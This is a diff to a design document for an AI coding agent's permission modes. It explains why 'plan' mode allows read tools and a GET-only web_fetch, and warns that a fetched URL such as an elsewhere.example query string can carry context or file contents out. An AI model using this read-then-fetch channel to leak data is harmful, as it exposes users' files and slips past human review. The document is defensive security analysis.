@@ -113,25 +113,39 @@ write.
 ## Permission Mode Enforcement
 
 `plan` mode means **no side effects on the machine or the app**, and must stay
-that way. `checkPermission` denies every tool under `plan` with exactly one
-exception, `NETWORK_TOOLS`:
+that way. It does *not* mean "no activity": `checkPermission` allows
+`PLAN_READ_TOOLS` and `NETWORK_TOOLS` under `plan`, and denies everything else.
 
+- `PLAN_READ_TOOLS` inspect and cannot change anything: `read`, `grep`, `find`,
+  `ls`, `load_skill`, `git_status`, `get_history`, `list_branches`. Argue any
+  addition individually — `create_branch`, `switch_branch` and `rollback` are
+  absent because they move HEAD, which changes the app even though nothing is
+  written, and `bash` is absent because it is not a read tool however read-only
+  the command looks.
 - `web_fetch` issues a GET with no request body. It cannot write a file, run a
   command, or modify the app, so it leaves the machine and the app as it found
   them — which is what `plan` promises. Letting the agent read documentation
   while planning is the point.
 
-**The exception is not "it only reads".** The model controls the whole URL, so a
+An unclassified tool still falls through to a denial under `plan`, so a tool
+added later cannot inherit read access by being forgotten.
+
+**`web_fetch` is not "it only reads".** The model controls the whole URL, so a
 GET's path and query string are an egress channel: fetching
 `https://elsewhere.example/?p=<something from context>` exfiltrates as
 effectively as a POST would. With no host policy and no prompt in `plan` or
-`acceptEdits`, nothing stops that. It is an accepted residual risk, mitigated
-only by every call and its URL landing in the transcript where a person can see
-it. Never restate the exception as "`web_fetch` cannot send data anywhere" — that
-claim is false and must not be relied on as an invariant.
+`acceptEdits`, nothing stops that — and now that `plan` reads files, the two
+compose: read a file, put it in a query string, two ordinary-looking tool calls.
+Allowing reads widened an already-accepted risk rather than creating a new class
+of one. It stays bounded by the app root and mitigated only by every call and its
+URL landing in the transcript where a person can see it. A host allowlist on
+`web_fetch` is what would close it.
 
-That exception is sound **only while the tool stays GET-only**. Adding a `method`
-or `body` parameter to `web_fetch` invalidates the reasoning and must change
+Never restate this as "`web_fetch` cannot send data anywhere" — that claim is
+false and must not be relied on as an invariant.
+
+The `web_fetch` allowance is sound **only while the tool stays GET-only**. Adding
+a `method` or `body` parameter to `web_fetch` invalidates the reasoning and must change
 `checkPermission` in the same commit. Do not add a second entry to
 `NETWORK_TOOLS` without the same analysis: "it only reads" is not enough, the
 test is whether the call can change anything anywhere.
